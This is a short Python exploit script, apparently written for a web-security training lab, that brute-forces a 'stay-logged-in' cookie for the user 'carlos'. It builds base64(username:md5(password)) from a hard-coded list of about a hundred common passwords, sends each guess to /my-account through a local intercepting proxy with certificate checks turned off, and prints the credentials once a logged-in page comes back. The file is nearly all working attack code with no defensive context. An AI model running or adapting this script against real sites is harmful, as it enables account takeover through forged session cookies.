import requests
import sys
import hashlib
import base64
import urllib3
from colorama import *
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
yellow = Fore.YELLOW
green = Fore.GREEN
username = 'carlos'
passwords = ['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666', 'qwertyuiop', '123321', 'mustang', '1234567890', 'michael', '654321', 'superman', '1qaz2wsx', '7777777', '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm', 'asdfgh', 'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew', 'tigger', 'sunshine', 'iloveyou', '2000', 'charlie', 'robert', 'thomas', 'hockey', 'ranger', 'daniel', 'starwars', 'klaster', '112233', 'george', 'computer', 'michelle', 'jessica', 'pepper', '1111', 'zxcvbn', '555555', '11111111', '131313', 'freedom', '777777', 'pass', 'maggie', '159753', 'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda', 'summer', 'love', 'ashley', 'nicole', 'chelsea', 'biteme', 'matthew', 'access', 'yankees', '987654321', 'dallas', 'austin', 'thunder', 'taylor', 'matrix', 'mobilemail', 'mom', 'monitor', 'monitoring', 'montana', 'moon', 'moscow']
url = sys.argv[1]
init(autoreset=True)

def exploit(url):
        print(yellow + '[!] BruteForsing the password....')
        for password in passwords:
            url_2fa = url + '/my-account'
            hashed_password = hashlib.md5(password.encode()).hexdigest()
            session_data = f'{username}:{hashed_password}'
            hashed_cookie_session = base64.b64encode(session_data.encode()).decode()
            cookies = {'stay-logged-in': hashed_cookie_session}
            r = requests.post(url_2fa, cookies=cookies, verify=False, proxies=proxies)
            res = r.text 
            if 'Log out' in res:
                print (green + f'[+] The credentials: {username}@{password}')
                return True

def main():
    if len(sys.argv) != 2:
        print (yellow + '[-] Uagse : %s <url>' % sys.argv[0])
        sys.exit(-1)      
    exploit(url)
if __name__ == '__main__':
    main()
    